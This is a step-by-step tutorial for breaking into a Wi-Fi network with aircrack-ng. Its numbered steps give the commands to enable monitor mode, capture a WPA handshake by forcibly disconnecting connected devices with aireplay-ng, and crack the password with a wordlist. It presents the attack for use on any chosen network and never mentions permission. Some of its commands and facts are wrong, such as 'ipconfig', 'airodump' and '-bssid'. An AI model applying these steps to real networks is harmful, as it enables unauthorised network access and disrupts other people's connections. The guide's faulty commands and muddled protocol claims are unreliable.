### Basic Information

#### 1.Encryption and authentication methods
- **Temporary Key Integrity Protocol(TKIP)**: Legacy protocol with dynamic key per packet and vulnerable to brute force.
- **Advanced Encryption Standard (AES)**: Secure symmetric encryption used in WPA2/WPA3 and standard in modern networks
- **Pre-Shared Key(PSK)**: Common protocol with shared key and vulerable to brute force.

---

### Requirements:
- Have Installed **aircrack-ng**.
- Wifi Adapter in Mode **Monitor**.

---


### 1. Download Aircrack-ng if you don't have Kali Linux
The first thing we need to do is install **aircrack-ng**. So to install it we need to type on the terminal: ```sudo apt-get install aircrack-ng```.

---

### 2. Turn Wifi Adapter into Mode Monitor
When we have installed aircrack-ng the next step will be turning the adapter into mode monitor. So to do that we need to go to terminal and add this command: ```sudo airmon-ng start [interface of the adapter]```.

If we don't know the interface of the adapter we will do a ```ipconfig``` to look which interfaces we have.

---

### 3. Scanning the Wifi Networks
To scan the wifi's that we could connect we will use the command: ```sudo airodump-ng [interface + mon]```. With this command we could see all the possible wifi networks, but we will focus on the one you want.

---

### 4. Capturing the Handshake
When we know the BSSID and the chanel of the wifi network we will do a handshake focus only that network. Adding this command: ```sudo airodump -c [channel of the wifi] -bssid [BSSID of the network] -w [name for the file] [interface of the adapter + mon]```.

Then we will do ```sudo aireplay-ng -0 5 -a [BSSID] -c [STATION number of the device] [interface of the adapter + mon]```to make an attack to the devices connected to capture the Handshake.

---

### 5. Cracking the password
Finally to have the password of the wifi network we need to write this command: ```sudo aircrack-ng -w [rute of wordlist.txt] [file .pcap]``` and this command will search the password trying all words of the wordlist.
